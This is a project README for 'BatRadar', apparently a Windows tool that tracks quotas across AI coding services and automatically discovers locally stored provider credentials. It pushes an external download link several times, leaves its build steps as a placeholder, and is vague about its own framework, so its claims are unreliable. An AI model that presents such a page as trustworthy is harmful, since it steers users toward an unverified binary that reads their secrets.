# BatRadar - AI Coding Usage Monitor 2026

> **BatRadar is a Windows desktop utility that tracks usage and quotas across AI coding tools, presenting live provider data through an overlay, dashboard, and desktop alerts.**

[![Platform](https://img.shields.io/badge/Platform-Windows%20desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mathis-zimmer42/batradar-windows-monitor?style=flat-square)](https://github.com/mathis-zimmer42/batradar-windows-monitor)

---

<p align="center">
  <a href="https://mathis-zimmer42.github.io/batradar-windows-monitor/">
    <img src="https://img.shields.io/badge/Download-BatRadar%20Latest-brightgreen?style=for-the-badge" alt="Download BatRadar">
  </a>
</p>

> **[Download the latest BatRadar build](https://mathis-zimmer42.github.io/batradar-windows-monitor/)**

---

[Download Latest Build](https://mathis-zimmer42.github.io/batradar-windows-monitor/)

---

## Overview

BatRadar brings usage and quota information from multiple AI coding services into one Windows desktop workspace. A floating overlay provides quick status visibility, while the main dashboard offers a more detailed view without requiring developers to move between separate tools.

It is intended for workflows using services such as Claude Code, Codex, Gemini CLI, GitHub Copilot, OpenRouter, and Antigravity. Live polling, historical charts, configurable notifications, and system tray support help BatRadar remain useful during both brief checks and extended coding sessions.

---

## What BatRadar Includes

- A floating overlay that shows usage at a glance
- Provider-specific dashboard views for supported AI coding services
- Background polling to keep provider information refreshed
- Historical charts for examining usage across time
- Warning and critical alerts based on quota thresholds
- System tray support for quiet background operation
- Support for Claude Code, Codex, Gemini CLI, GitHub Copilot, OpenRouter, and Antigravity
- Windows autostart when BatRadar should open with the desktop
- Automatic credential discovery where supported
- Local persistence for application information and usage history
- Drag-and-drop cards for customizing the dashboard layout

---

## Getting Started

1. Visit the [latest BatRadar download page](https://mathis-zimmer42.github.io/batradar-windows-monitor/).
2. Obtain the Windows desktop build.
3. Install or unpack it using the instructions supplied with the package.
4. Open BatRadar from the Start menu or from the directory containing the extracted application.
5. Check the providers BatRadar discovers, then configure the dashboard for daily use.

To work from a repository checkout, clone the project and follow the desktop build guidance supplied with the release:

```text
git clone https://github.com/mathis-zimmer42/batradar-windows-monitor.git
cd REPO
```

BatRadar is designed as a Windows desktop application using a desktop application framework such as Electron or Tauri.

---

## Using BatRadar

The usual setup and monitoring flow is:

1. Launch BatRadar on Windows.
2. Let it look for provider credentials available on the machine.
3. Inspect the detected services in the usage dashboard.
4. Reorder provider cards by dragging them into the preferred arrangement.
5. Turn on the floating overlay when persistent visibility is helpful.
6. Leave BatRadar running in the system tray during development.
7. Use the history charts to review recent activity and act on warning or critical notifications.

The providers and data available in the application depend on the services configured locally and on the credentials BatRadar can access.

---

## Settings and Local Data

BatRadar stores its application information locally and exposes its controls through the desktop settings interface.

From settings, you can:

- Choose the providers displayed on the dashboard
- Reorganize provider cards
- Set warning and critical alert behavior
- Turn the floating overlay on or off
- Manage Windows autostart
- Inspect discovered credentials and provider status
- Decide whether the application continues running in the system tray

Usage history and other related application data remain on the Windows machine. The precise storage path depends on the desktop runtime and the way BatRadar was installed.

---

## System Requirements

- A Windows desktop environment
- A Windows build of BatRadar
- Access to at least one supported AI coding service
- Locally available provider credentials when automatic detection is applicable
- Network connectivity for background polling
- Local storage capacity for application data and usage history

BatRadar is intended for use with Claude Code, Codex, Gemini CLI, GitHub Copilot, OpenRouter, and Antigravity. The amount and type of provider information shown may vary based on what each service makes available.

---

## Frequently Asked Questions

### Can BatRadar run on other platforms?

BatRadar is intended for Windows desktop environments.

### What AI coding services are supported?

BatRadar includes profiles for Claude Code, Codex, Gemini CLI, GitHub Copilot, OpenRouter, and Antigravity. The displayed information for a provider depends on its available credentials and usage data.

### Must the application remain running?

Yes, BatRadar must stay active to perform background polling and provide the overlay, notifications, and system tray behavior. Windows autostart is available when automatic launching is preferred.

### Where does BatRadar save settings and usage history?

Application data and usage history are stored locally. Their exact location can differ based on the installation package and the desktop runtime in use.

### What can I do when a provider has no usage data?

Verify that the provider is configured, that BatRadar can access the necessary credentials, and that the computer has network connectivity. Restarting BatRadar may also trigger provider detection again.

### Where are quota alerts controlled?

Warning and critical notification behavior can be changed in the application settings. These alerts are designed to draw attention to changes in provider usage or quota status.

### How can I find new versions?

Visit the [latest BatRadar build](https://mathis-zimmer42.github.io/batradar-windows-monitor/) to check for newly published downloads and release information.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
